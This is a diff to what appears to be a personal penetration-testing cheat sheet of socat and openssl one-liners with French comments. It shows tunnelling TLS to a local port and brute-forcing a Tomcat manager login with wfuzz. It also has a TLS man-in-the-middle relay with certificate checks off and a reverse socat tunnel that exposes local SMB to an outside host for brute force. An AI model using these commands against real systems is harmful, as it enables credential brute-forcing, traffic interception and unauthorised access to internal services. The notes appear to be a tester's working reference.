@@ -19,14 +19,8 @@ openssl s_client -connect 1.2.3.4:443 -ign_eof -quiet -sess_out ssl_session.ctx
 socat -d TCP4-L:9090,reuseaddr,fork exec:'openssl s_client -host 1.2.3.4 -port 443 -ign_eof -quiet -sess_in ssl_session.ctx' 2>/dev/null
 ./wfuzz.py -c -z file -f ~/dico.txt --basic 'manager:FUZZ' --hc 401 http://127.0.0.1:9090/manager/html/
 
-# loggue les requetes HTTP et retourne une reponse HTTP statique
-socat TCP-LISTEN:80,fork,reuseaddr EXEC:'path/to/httplogger.py'
-socat openssl-listen:443,fork,reuseaddr,verify=0,cert=path/to/cert+key.pem EXEC:'path/to/httplogger.py' (verify=1 -> certificat client obligatoire)
-
 # sslmitm
-socat -v openssl-listen:8081,fork,reuseaddr,cert=cert.pem,key=key.pem,verify=0 tcp:127.0.0.1:3306
-socat -v tcp-l:3306,reuseaddr,fork openssl:1.2.3.4:443,verify=0
-/etc/init.d/dnsmasq start && less +F /tmp/dnsmasq.log
+socat -v openssl-listen:8081,fork,reuseaddr,cert=localhost.pem,verify=0 openssl:1.2.3.4:443,verify=0
 
 # reverse socat to bf local services
 clt: socat -d tcp:mabox:1234,fork,interval=1,forever tcp:127.0.0.1:445
